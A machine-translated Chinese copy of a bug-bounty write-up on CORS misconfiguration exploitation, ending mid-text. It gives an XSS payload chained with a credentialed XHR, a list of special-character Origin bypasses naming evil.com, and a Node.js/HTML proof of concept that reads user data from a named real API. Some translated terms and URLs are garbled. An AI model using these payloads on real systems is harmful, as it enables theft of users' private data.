<html>
<head>
<title>Think Outside the Scope: Advanced CORS Exploitation Techniques</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">思考范围之外:先进的CORS开发技术</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397?source=collection_archive---------0-----------------------#2019-05-14">https://infosecwriteups.com/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397?source=collection_archive---------0-----------------------#2019-05-14</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="6e0e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大家好，</p><p id="03e1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我叫阿尤布，是来自摩洛哥的安全研究员。在本文中，我将描述我如何能够利用CORS错误配置的两个不同案例:第一个案例基于XSS，需要超出范围的思考，第二个案例基于高级CORS利用技术。</p><blockquote class="kl km kn"><p id="94e7" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">注意:在你开始阅读这篇文章之前，你需要对什么是CORS以及如何利用错误配置有一个基本的了解。这里有一些很棒的帖子可以让你跟上:</p></blockquote><ul class=""><li id="9054" class="ks kt iq jp b jq jr ju jv jy ku kc kv kg kw kk kx ky kz la bi translated"><a class="ae lb" href="http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> Portswigger的帖子</strong> </a></li><li id="60b5" class="ks kt iq jp b jq lc ju ld jy le kc lf kg lg kk kx ky kz la bi translated"><a class="ae lb" href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">极客的Pos </strong> </a> <strong class="jp ir"> t </strong></li></ul></div><div class="ab cl lh li hu lj" role="separator"><span class="lk bw bk ll lm ln"/><span class="lk bw bk ll lm ln"/><span class="lk bw bk ll lm"/></div><div class="ij ik il im in"><h1 id="ba48" class="lo lp iq bd lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml bi translated">案例:#1</h1><h2 id="1c6a" class="mm lp iq bd lq mn mo dn lu mp mq dp ly jy mr ms mc kc mt mu mg kg mv mw mk mx bi translated">易受攻击端点</h2><p id="4b67" class="pw-post-body-paragraph jn jo iq jp b jq my js jt ju mz jw jx jy na ka kb kc nb ke kf kg nc ki kj kk ij bi translated">大约一年前，我在黑这个私人程序，由HackerOne主持。在处理了HTTP请求中的Origin头，然后检查服务器响应以检查它们是否做了域白名单检查之后，我注意到应用程序只是盲目地将子域列入白名单，甚至是不存在的子域。</p><p id="b404" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">出于隐私原因和负责任的披露政策，让我们假设web应用程序位于:<a class="ae lb" href="http://www.redacted.com" rel="noopener ugc nofollow" target="_blank">www.redacted.com</a></p><p id="2f4a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个CORS错误配置看起来像这样:</p><p id="8d99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ko"> HTTP请求:</em> </strong></p><blockquote class="kl km kn"><p id="6121" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">GET /api/return HTTP/1.1 <br/>主机:<a class="ae lb" href="http://www.redacted.com" rel="noopener ugc nofollow" target="_blank">www.redacted.com</a>T21】产地:<strong class="jp ir">evil.redacted.com</strong>T24】连接:关闭</p></blockquote><p id="ec3c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ko"> HTTP响应:</em> </strong></p><blockquote class="kl km kn"><p id="41fc" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">HTTP/1.1 200 OK <br/>访问控制允许凭证:true <br/>访问控制允许来源:<strong class="jp ir">evil.redacted.com</strong></p></blockquote><p id="2f54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个API端点返回用户的私人信息，比如全名、电子邮件地址等等。</p><p id="3968" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了滥用这种错误配置，我们可以进行攻击，比如泄露用户的私人信息，我们需要声明一个废弃的子域(<strong class="jp ir">子域接管)、</strong>或者在一个现有的子域中找到一个<strong class="jp ir"> XSS </strong>。</p><h2 id="6f04" class="mm lp iq bd lq mn mo dn lu mp mq dp ly jy mr ms mc kc mt mu mg kg mv mw mk mx bi translated">跳出范围思考</h2><p id="5054" class="pw-post-body-paragraph jn jo iq jp b jq my js jt ju mz jw jx jy na ka kb kc nb ke kf kg nc ki kj kk ij bi translated">找到一个废弃的子域并不是那么简单，所以我决定选择第二种方法，在一个现有的子域中找到一个XSS。然而，这个私有程序的范围仅限于:<a class="ae lb" href="http://www.redacted.com," rel="noopener ugc nofollow" target="_blank">www.redacted.com，</a>这意味着在其他子域中查找XSS肯定不在范围之内，但是将这个XSS与CORS错误配置链接起来却在范围之内。对吗？</p><p id="d154" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">事实上，其他子域名不在范围之内，这让我更有信心，因为其他黑客不会测试它们，所以在这些子域名上找到XSS的机会很大。</p><p id="b348" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">于是，我开始寻找这个XSS，带着一颗充满希望的心去寻找，不到一个小时，我在banques.redacted.com<em class="ko"/>的<strong class="jp ir">找到了一个，使用的有效载荷如下:</strong></p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="571c" class="mm lp iq ni b gy nm nn l no np"><em class="ko">https://banques.redacted.com/choice-quiz?form_banque=</em><strong class="ni ir"><em class="ko">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</em></strong><em class="ko">&amp;form_cartes=73&amp;iframestat=1</em></span></pre><figure class="nd ne nf ng gt nr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi nq"><img src="../Images/dca3d0cffd29adfa3794f1d9386fd131.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*m3TSXXSnBjdFd0Yfg8kQPg.png"/></div></div></figure><p id="a326" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是时候创建一个不错的概念证明，并提交报告了</p><h2 id="73d0" class="mm lp iq bd lq mn mo dn lu mp mq dp ly jy mr ms mc kc mt mu mg kg mv mw mk mx bi translated">再现:</h2><p id="2561" class="pw-post-body-paragraph jn jo iq jp b jq my js jt ju mz jw jx jy na ka kb kc nb ke kf kg nc ki kj kk ij bi translated">因此，要利用这个CORS错误配置，我们只需用以下代码替换XSS有效负载<strong class="jp ir"><em class="ko">alert(document . domain)</em></strong>:</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="88be" class="mm lp iq ni b gy nm nn l no np">function cors() {  <br/>var xhttp = new XMLHttpRequest();  <br/>xhttp.onreadystatechange = function() {    <br/>    if (this.status == 200) {    <br/>    alert(this.responseText);     <br/>    document.getElementById("demo").innerHTML = this.responseText;    <br/>    }  <br/>};  <br/>xhttp.open("GET", "<strong class="ni ir"><em class="ko">https://www.redacted.com/api/return</em></strong>", true);  <br/>xhttp.withCredentials = true;  <br/>xhttp.send();<br/>}<br/>cors();</span></pre><p id="7d56" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">像这样:</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="b8df" class="mm lp iq ni b gy nm nn l no np"><em class="ko">https://banques.redacted.com/choice-quiz?form_banque=</em><strong class="ni ir"><em class="ko">"&gt;</em>&lt;script&gt;<em class="ko">function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://www.redacted.com/api/return",true);xhttp.withCredentials=true;xhttp.send()}cors();</em>&lt;/script&gt;</strong><em class="ko">&amp;form_cartes=73&amp;iframestat=1</em></span></pre><p id="2732" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">瞧，我们现在有了一个不错的概念验证:</p><figure class="nd ne nf ng gt nr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi ny"><img src="../Images/7a87bad738f6621aa53b3a0c40cb03e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7ZIq0-qjRx7weah76ukacQ.png"/></div></div></figure><h2 id="ca36" class="mm lp iq bd lq mn mo dn lu mp mq dp ly jy mr ms mc kc mt mu mg kg mv mw mk mx bi translated">报酬</h2><figure class="nd ne nf ng gt nr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi nz"><img src="../Images/26959e1302daff3616427487e20119de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ig3hvRwAyi0krnht-rDK-g.png"/></div></div></figure><p id="0e74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，如果我告诉你，你仍然可以滥用这个问题，而不需要在任何现有的子域名中找到一个XSS，或声称一个被遗弃的。</p><p id="a94e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这正是我们将在第二个案例中讨论的。</p></div><div class="ab cl lh li hu lj" role="separator"><span class="lk bw bk ll lm ln"/><span class="lk bw bk ll lm ln"/><span class="lk bw bk ll lm"/></div><div class="ij ik il im in"><h1 id="1006" class="lo lp iq bd lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml bi translated">案例:#2</h1><h2 id="1461" class="mm lp iq bd lq mn mo dn lu mp mq dp ly jy mr ms mc kc mt mu mg kg mv mw mk mx bi translated"><strong class="ak">易受攻击的端点</strong></h2><p id="b511" class="pw-post-body-paragraph jn jo iq jp b jq my js jt ju mz jw jx jy na ka kb kc nb ke kf kg nc ki kj kk ij bi translated">这一次，我在做<strong class="jp ir"> Ubnt </strong>程序，特别是托管在<strong class="jp ir"><em class="ko">https://protect.ubnt.com/</em></strong>的应用程序</p><p id="81f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">按照相同的过程，我发现了相同的CORS错误配置，与前面的情况类似，但这次应用程序从不同的位置获取用户的私人信息，一个API托管在:<a class="ae lb" href="https://client.amplifi.com/" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="ko">https://client.amplifi.com/</em></strong></a><strong class="jp ir"><em class="ko">API/user/</em></strong></p><p id="0603" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该应用程序还盲目地将任何子域列入白名单，甚至是不存在的子域。</p><figure class="nd ne nf ng gt nr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi oa"><img src="../Images/ee5ddd73a553c23ad262ed10b195878c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bP9Qa-oThHdqYbH7ZaJvLA.png"/></div></div></figure><p id="85a6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我们之前所讨论的，要滥用这种CORS错误配置，你需要声明一个废弃的子域，或者在一个现有的子域中找到一个XSS。</p><p id="e431" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">而且由于这是一个公共程序，范围很大(所有子域都在范围内)；找到XSS的机会微乎其微，更不用说子域接管漏洞了。</p><p id="3fd9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么，我们是不是走进了死胡同？</p><h2 id="311e" class="mm lp iq bd lq mn mo dn lu mp mq dp ly jy mr ms mc kc mt mu mg kg mv mw mk mx bi translated">先进的CORS技术</h2><p id="313e" class="pw-post-body-paragraph jn jo iq jp b jq my js jt ju mz jw jx jy na ka kb kc nb ke kf kg nc ki kj kk ij bi translated">事实证明，还有另一种方法，但这需要一定的条件。</p><p id="59f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最近<strong class="jp ir">柯本狮子座</strong>做了一个有趣的研究，在这里  可以找到<a class="ae lb" href="https://www.corben.io/advanced-cors-techniques/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="ko">。展示了通过在域名中使用特殊字符来绕过某些不正确实现的控件是可能的。</em></strong></a></p><p id="5c94" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这项研究是基于这样一个事实，即浏览器在发出请求之前并不总是验证域名。因此，如果使用了某些特殊字符，浏览器可能会在没有事先验证域名是否有效和存在的情况下提交请求。</p><h2 id="4da1" class="mm lp iq bd lq mn mo dn lu mp mq dp ly jy mr ms mc kc mt mu mg kg mv mw mk mx bi translated">示例:</h2><p id="b941" class="pw-post-body-paragraph jn jo iq jp b jq my js jt ju mz jw jx jy na ka kb kc nb ke kf kg nc ki kj kk ij bi translated">为了充分理解这个问题，让我们尝试打开一个带有特殊字符的URL，例如:<a class="ae lb" href="http://asdf`+=.withgoogle.com." rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="ko">http://asdf `+ = . with Google . com .</em></strong></a><strong class="jp ir"><em class="ko"/></strong>大多数浏览器在发出任何请求之前都会验证域名。</p><p id="fe0b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">域名<a class="ae lb" href="http://asdf`+=.withgoogle.com." rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="ko"/></strong></a><strong class="jp ir"><em class="ko"/></strong>被用作演示，因为它的<strong class="jp ir"> <em class="ko"> </em> </strong>有一个<strong class="jp ir">通配符DNS记录</strong></p><blockquote class="kl km kn"><p id="a0dd" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">铬:</strong></p></blockquote><figure class="nd ne nf ng gt nr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi ob"><img src="../Images/3e2d6babcf64e86b39cf8ac7e9eb37f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6cNpl1Zs89f4XQz6pqkr4g.png"/></div></div><figcaption class="oc od gj gh gi oe of bd b be z dk translated">来自<a class="ae lb" href="https://www.corben.io/advanced-cors-techniques/" rel="noopener ugc nofollow" target="_blank">https://www.corben.io/advanced-cors-techniques/</a></figcaption></figure><blockquote class="kl km kn"><p id="2b4d" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">火狐:</strong></p></blockquote><figure class="nd ne nf ng gt nr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi og"><img src="../Images/54909dce2b8bbacb460fd02143e6c1a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ku5x_N1SqDuDG5UOK1QtsQ.png"/></div></div><figcaption class="oc od gj gh gi oe of bd b be z dk translated">来自<a class="ae lb" href="https://www.corben.io/advanced-cors-techniques/" rel="noopener ugc nofollow" target="_blank">https://www.corben.io/advanced-cors-techniques/</a></figcaption></figure><blockquote class="kl km kn"><p id="1262" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">游猎:</strong></p></blockquote><p id="d00f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如你所见，Safari是个例外，它会发送请求并尝试加载页面，这与其他浏览器不同。</p><figure class="nd ne nf ng gt nr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi oh"><img src="../Images/8da17ca0cf32dd2c29a217ee2a271787.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1ni7rBWaTdQRxjDia3tDrg.png"/></div></div><figcaption class="oc od gj gh gi oe of bd b be z dk translated">来自<a class="ae lb" href="https://www.corben.io/advanced-cors-techniques/" rel="noopener ugc nofollow" target="_blank">https://www.corben.io/advanced-cors-techniques/</a></figcaption></figure><p id="50be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用各种不同的字符，甚至是不可打印的字符:</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="6305" class="mm lp iq ni b gy nm nn l no np">,&amp;'";!$^*()+=`~-_=|{}%<br/><br/>// non printable chars<br/>%01-08,%0b,%0c,%0e,%0f,%10-%1f,%7f</span></pre><p id="8081" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，大卫·达内隆的另一项研究表明，这些特殊字符的其他子集也可以在其他浏览器上使用。</p><figure class="nd ne nf ng gt nr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi oi"><img src="../Images/a1793343e3e92aae74633ac592a12f04.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rolEK39-DDxeBgSq6KLKAA.png"/></div></div><figcaption class="oc od gj gh gi oe of bd b be z dk translated">出自<a class="ae lb" href="https://www.bedefended.com/papers/cors-security-guide" rel="noopener ugc nofollow" target="_blank"> <strong class="bd lq">大卫【达内隆】</strong> </a> <strong class="bd lq"> </strong>考证:<strong class="bd lq"/><a class="ae lb" href="https://www.bedefended.com/papers/cors-security-guide" rel="noopener ugc nofollow" target="_blank"><strong class="bd lq">【https://www.bedefended.com/papers/cors-security-guide】</strong></a></figcaption></figure><p id="c2e9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们知道了所有这些，我们怎么能滥用这个问题来执行高级CORS利用技术，为了更好的演示，让我们回到易受攻击的web应用程序上:<a class="ae lb" href="https://client.amplifi.com/" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="ko">https://client.amplifi.com/</em></strong></a></p><h2 id="e19f" class="mm lp iq bd lq mn mo dn lu mp mq dp ly jy mr ms mc kc mt mu mg kg mv mw mk mx bi translated">新方法</h2><p id="0bcc" class="pw-post-body-paragraph jn jo iq jp b jq my js jt ju mz jw jx jy na ka kb kc nb ke kf kg nc ki kj kk ij bi translated">在这种情况下，web应用程序也接受下面的Origin <strong class="jp ir"> <em class="ko"> *.ubnt.com！. evil.com </em> </strong></p><figure class="nd ne nf ng gt nr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi oa"><img src="../Images/8bb75154df68ab6f236a1908d874b227.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EbWzrlzNrUaRsF5dGlXppA.png"/></div></div></figure><p id="5620" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不仅仅是字符“！”，但也有以下几种:</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="0ac4" class="mm lp iq ni b gy nm nn l no np">*.ubnt.com!.evil.com <br/>*.ubnt.com".evil.com <br/>*.ubnt.com$.evil.com <br/>*.ubnt.com%0b.evil.com <br/>*.ubnt.com%60.evil.com <br/>*.ubnt.com&amp;.evil.com <br/>*.ubnt.com'.evil.com <br/>*.ubnt.com(.evil.com <br/>*.ubnt.com).evil.com <br/>*.ubnt.com*.evil.com <br/>*.ubnt.com,.evil.com <br/>*.ubnt.com;.evil.com <br/>*.ubnt.com=.evil.com <br/>*.ubnt.com^.evil.com <br/>*.ubnt.com`.evil.com <br/>*.ubnt.com{.evil.com <br/>*.ubnt.com|.evil.com <br/>*.ubnt.com}.evil.com <br/>*.ubnt.com~.evil.com</span></pre><p id="7c70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在你应该知道一些浏览器，比如Safari，接受带有特殊字符的URL，比如:<strong class="jp ir"><em class="ko">https://zzzz . ubnt . com = . evil . com</em></strong>。</p><p id="26d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以如果我们设置一个域名:<strong class="jp ir"><em class="ko">evil.com</em></strong>用<strong class="jp ir">通配符DNS记录，</strong>允许指向所有子域(*。<em class="ko">evil.com)</em>到<a class="ae lb" href="http://www.evil.com," rel="noopener ugc nofollow" target="_blank">www.evil.com</a>，它们将在类似于<strong class="jp ir"><em class="ko">www.evil.com/cors-poc</em></strong>的页面中托管一个脚本，该脚本将简单地向易受攻击的端点发送一个以子域名为初始值的跨域请求</p><p id="5199" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后不知怎么的我们强制一个认证用户打开了链接:<a class="ae lb" href="https://zzzz.ubnt.com!.evil.com" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="ko">https://zzzz . ubnt . com = . evil . com</em></strong></a><strong class="jp ir"><em class="ko">/CORS-POC</em></strong></p><p id="4c69" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">理论上，我们可以泄露这个用户的私人信息。</p><h2 id="bc00" class="mm lp iq bd lq mn mo dn lu mp mq dp ly jy mr ms mc kc mt mu mg kg mv mw mk mx bi translated">再现:</h2><ol class=""><li id="cfbe" class="ks kt iq jp b jq my ju mz jy oj kc ok kg ol kk om ky kz la bi translated">首先，设置一个带有通配符DNS记录的域，将它指向您的机器，在我的例子中，我使用GoDaddy托管我的域，配置如下:</li></ol><figure class="nd ne nf ng gt nr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi on"><img src="../Images/3032b32a2c384fd3eb549be3963b86b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Mh0iEm9PlfKy-hnnVn5yiA.png"/></div></div></figure><p id="840a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.安装NodeJS，创建一个新目录，然后在其中保存以下文件:</p><p id="86e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">T51】serve . jsT53】</strong></p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="1c04" class="mm lp iq ni b gy nm nn l no np">var http = require('http');<br/>var url  = require('url');<br/>var fs   = require('fs');<br/>var port = 80<br/><br/>http.createServer(function(req, res) {<br/>    if (req.url == '/cors-poc') {<br/>        fs.readFile('cors.html', function(err, data) {<br/>            res.writeHead(200, {'Content-Type':'text/html'});<br/>            res.write(data);<br/>            res.end();<br/>        });<br/>    } else {<br/>        res.writeHead(200, {'Content-Type':'text/html'});<br/>        res.write('never gonna give you up...');<br/>        res.end();<br/>    }<br/>}).listen(port, '0.0.0.0');<br/>console.log(`Serving on port ${port}`);</span></pre><p id="0ce3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.在同一目录中，保存以下内容:</p><p id="830a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"><em class="ko">cors.html</em></strong></p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="67c1" class="mm lp iq ni b gy nm nn l no np">&lt;!DOCTYPE html&gt;<br/>&lt;html&gt;<br/>&lt;head&gt;&lt;title&gt;CORS&lt;/title&gt;&lt;/head&gt;<br/>&lt;body onload="cors();"&gt;<br/>&lt;center&gt;<br/>cors proof-of-concept:&lt;br&gt;&lt;br&gt;<br/>&lt;textarea rows="10" cols="60" id="pwnz"&gt;<br/>&lt;/textarea&gt;&lt;br&gt;<br/>&lt;/div&gt;<br/><br/>&lt;script&gt;<br/>function cors() {<br/>  var xhttp = new XMLHttpRequest();<br/>  xhttp.onreadystatechange = function() {<br/>    if (this.readyState == 4 &amp;&amp; this.status == 200) {<br/>      document.getElementById("pwnz").innerHTML = this.responseText;<br/>    }<br/>  };<br/>  xhttp.open("GET", "<strong class="ni ir"><em class="ko">https://</em></strong><strong class="ni ir"><em class="ko">client.amplifi.com</em></strong><strong class="ni ir"><em class="ko">/api/user/</em></strong>", true);<br/>  xhttp.withCredentials = true;<br/>  xhttp.send();<br/>}<br/>&lt;/script&gt;</span></pre><p id="63be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.通过运行以下命令启动NodeJS服务器:</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="9667" class="mm lp iq ni b gy nm nn l no np">node serve.js &amp;</span></pre><p id="e52c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5.现在，登录到应用程序:<a class="ae lb" href="https://protect.ubnt.com/" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">【https://protect.ubnt.com/】</strong></a><strong class="jp ir"><em class="ko"/></strong>，并检查您是否可以从端点:<strong class="jp ir"><em class="ko">【https://client.amplifi.com/api/user/】</em></strong>检索您的帐户信息</p><p id="e804" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">6.最后在Safari浏览器中打开链接:<a class="ae lb" href="https://zzzz.ubnt.com!.evil.com" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="ko">https://zzzz . ubnt . com = . evil . com</em></strong></a><strong class="jp ir"><em class="ko">/CORS-POC</em></strong>，Voilà。</p><p id="0241" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我的情况下，我使用iPhone中的Safari浏览器作为PoC，因为我没有Mac电脑。</p><figure class="nd ne nf ng gt nr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi oo"><img src="../Images/d50cd881efbb48061029439ea309285f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4Fm5oVWqbR2KyjJ-Yw1tVQ.jpeg"/></div></div></figure><h2 id="8909" class="mm lp iq bd lq mn mo dn lu mp mq dp ly jy mr ms mc kc mt mu mg kg mv mw mk mx bi translated">报酬</h2><figure class="nd ne nf ng gt nr gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi op"><img src="../Images/386ed4d892d87bd7596dd0a623c090f8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_0FIr2SDyu76xnCIxXBUCw.png"/></div></div></figure></div><div class="ab cl lh li hu lj" role="separator"><span class="lk bw bk ll lm ln"/><span class="lk bw bk ll lm ln"/><span class="lk bw bk ll lm"/></div><div class="ij ik il im in"><h1 id="ee30" class="lo lp iq bd lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml bi translated">外卖食品</h1><p id="662c" class="pw-post-body-paragraph jn jo iq jp b jq my js jt ju mz jw jx jy na ka kb kc nb ke kf kg nc ki kj kk ij bi translated">我相信许多安全研究人员已经遇到过这种情况，您可以在HackerOne中找到许多描述这种类型CORS错误配置的报告，但是只有少数人能够充分利用它，因为他们的报告中缺少概念验证。</p><p id="d31f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这也是我想分享我的经历的原因之一。同时强调利用此类漏洞的其他技术。</p><p id="f5ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv 